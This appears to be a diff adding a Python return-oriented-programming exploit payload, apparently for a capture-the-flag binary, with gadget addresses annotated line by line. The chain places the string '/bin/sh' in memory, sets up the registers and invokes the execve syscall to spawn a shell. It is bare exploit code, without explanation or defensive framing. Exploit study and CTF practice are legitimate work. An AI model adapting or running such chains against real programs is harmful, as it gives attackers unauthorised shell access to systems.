@@ -1,0 +1,29 @@
+payload = p64(0x402459)
+#0x0000000000402459: pop rsi; pop rbp; ret; 
+payload += p64(0x427070)+p64(0x0)+p64(0x40125d)
+# 0x40125d: pop rbp ; ret
+payload += p64(0x402543)+p64(0x403aba)
+# 0x0000000000403aba: xchg eax, ebp; ret; 
+payload += p64(0x4088b8)
+# 0x00000000004088b8: mov ecx, esi; mov r8d, r15d; call rax; 
+payload += b''
+# 0x0000000000402543: pop rdi; pop rbp; ret; 
+payload += p64(0x0)+p64(0x4023c5)
+# 0x00000000004023c5: pop rbx; pop rbp; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x0)+p64(0x409952)
+# 0x0000000000409952: mov rax, rbx; add rsp, 8; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x412a0f)
+# 0x0000000000412a0f: add qword ptr [rcx], rax; mov eax, 1; pop rbp; ret; 
+payload += p64(0x0)+p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x427070)+p64(0x40d44c)
+# 0x000000000040d44c: pop rdx; xor eax, eax; ret; 
+payload += p64(0x0)+p64(0x414840)
+# 0x0000000000414840: xor esi, esi; mov eax, r14d; pop rbx; pop r14; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125d)
+# 0x40125d: pop rbp ; ret
+payload += p64(0x3b)+p64(0x403aba)
+# 0x0000000000403aba: xchg eax, ebp; ret; 
+payload += p64(0x413a7a)
+# 0x0000000000413a7a: syscall; 
+payload += b''
